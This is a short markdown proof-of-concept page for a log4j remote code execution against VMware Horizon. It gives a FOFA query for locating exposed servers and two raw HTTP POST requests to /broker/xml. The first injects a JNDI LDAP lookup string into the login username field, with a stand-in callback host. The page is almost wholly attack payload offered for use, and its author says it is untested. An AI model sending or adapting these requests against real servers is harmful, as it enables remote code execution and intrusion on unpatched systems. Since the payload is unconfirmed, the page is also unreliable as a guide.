# VMWare Horizon log4j RCE

## fofa

```
app="vmware-Horizon-DaaS"
```

## Poc

```
POST /broker/xml HTTP/1.1
Host: <TARGET>
Cookie: JSESSIONID=086D05062F2F437B0D36382DEFEF67FA
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 619

<?xml version="1.0"?>
<broker version="2.0">
 <do-submit-authentication>
 <screen>
 <name>disclaimer</name>
 <params>
 <param>
 <name>accept</name>
 <values>
 <value>true</value>
 </values>
 </param>
 </params>
 </screen>
 </do-submit-authentication>
 <do-submit-authentication>
 <screen>
 <name>securid-passcode</name>
 <params>
 <param>
 <name>username</name>
 <values>
 <value>${jndi:ldap://example.com}</value>
 </values>
 </param>
 <param>
 <name>passcode</name>
 <values>
 <value>271828183</value>
 </values>
 </param>
 </params>
 </screen>
 </do-submit-authentication>
</broker>
```

```
POST /broker/xml HTTP/1.1
Host: <TARGET>
Cookie: JSESSIONID=086D05062F2F437B0D36382DEFEF67FA
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 440

<?xml version='1.0' encoding='UTF-8'?><broker version='14.0'><do-submit-authentication><screen><name>windows-password</name><params><param><name>username</name><values><value>simon</value></values></param><param><name>domain</name><values><value>TEST</value></values></param><param><name>password</name><values><value>{SSO-AES:1}ZXbtEwRmeGs80cyD1sRsS6sVRgVt7pYR</value></values></param></params></screen></do-submit-authentication></broker>
```

I have not tested it, If anyone confirm it, Please contribute the test screenshot.
